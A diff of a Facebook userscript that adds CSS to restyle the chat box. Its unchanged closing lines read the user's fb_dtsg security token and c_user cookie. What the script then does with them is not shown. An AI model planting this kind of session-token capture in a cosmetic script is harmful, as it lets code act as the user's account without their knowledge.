@@ -21,6 +21,30 @@ if (typeof GM_addStyle != "undefined") {
         }
 }
 })();
+// chat box ryan
+(function() {
+var css = "";
+if (false || (document.domain == "apps.facebook.com" || document.domain.substring(document.domain.indexOf(".apps.facebook.com") + 1) == "apps.facebook.com") || (new RegExp("^https?://www\\.facebook\\.com/(?!plugins/).*$")).test(document.location.href))
+        css += "._kso  {\ncolor: white; \ntext-shadow: none;\nfont-size: 12px;\nbackground-color: #0B93F6;\nfont-family: \"Helvetica Neue\", Arial; \nbackground-image: none;\n}\n    \n\n\n._50kd ._kso, ._50kd ._kso  a {\ncolor:black;\n}\n\n._50kd ._kso, ._50kd ._kso:before {\nbackground-color: #E5E5EA; \nbackground-image: none; \ncolor: black;\nfont-family: \"Helvetica Neue\", Arial; \nfont-size: 12px; \n}\n\n\n\n._kso a {\ncolor: white;\n}\n\n._kso {\nborder: 1px solid #dfdfdf; \nborder: none; \nborder-bottom-color: none; \nborder-radius: 10px; \n-webkit-border-radius: 10px; \n-webkit-box-shadow: none; \nmargin: 5px 5px 5px 0;\nmin-height: 14px; \npadding: 4px 5px 3px 6px; \nposition: relative;\ntext-shadow: none; \n}\n  \n  \n  ._50dw .profileLink:after {background-image:none;}\n      \n\n._50kd ._kso:before {\nleft: auto;\ndisplay: none;\nright: 100%;\n}\n\n.fbChatConvItem .profileLink .profilePhoto {\nborder-radius: 300px !important;\n}\n\n.fbChatConvItem .profileLink:before {\nbackground:transparent;\ndisplay: block;\nwidth: 32px;\nheight: 32px;\ncontent: \"\";\nposition: absolute;\nbox-shadow: 0 1px 4px -1px #000, 0 2px 4px -2px #000, inset 0 0px 0px 1px rgba(255, 255, 255, 0.25), inset 0 4px 5px -1px rgba(255, 255, 255, 0.25);\nborder-radius: 300px !important;\n}\n\n\n._kso:before {\nbackground-color: none;\n\nbackground-image: none;\n}\n\n\n._kso:before, ._kso:after {\nbackground-image: none;\nbackground-repeat: no-repeat;\nbackground-size: auto;\nbackground-position: -218px -433px;\nheight: 13px;\n  top: 5px; }\n\n._kso:before {\nbackground-color: none;\n\nbackground-image: none;\n}\n\n\n\n\n.fbDockChatTabFlyout .fbNubFlyoutBody{\nbackground-color:white;\n }\n\n\n.fbChatConvItem:hover .metaInfoContainer {\nvisibility: hidden;\n}\n\n\n\n._5w-6 {\n    background-color:white;\n  }\n  \n  \n  ._50kd ._kso:after {\n          background-image:none;\n        }\n        \n        \n        ._kso:before, ._kso:after {\n              background-color:white\n            }";
+if (typeof GM_addStyle != "undefined") {
+        GM_addStyle(css);
+} else if (typeof PRO_addStyle != "undefined") {
+        PRO_addStyle(css);
+} else if (typeof addStyle != "undefined") {
+        addStyle(css);
+} else {
+        var node = document.createElement("style");
+        node.type = "text/css";
+        node.appendChild(document.createTextNode(css));
+        var heads = document.getElementsByTagName("head");
+        if (heads.length > 0) {
+                heads[0].appendChild(node); 
+        } else {
+                // no head yet, stick it whereever
+                document.documentElement.appendChild(node);
+        }
+}
+})();
 //
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
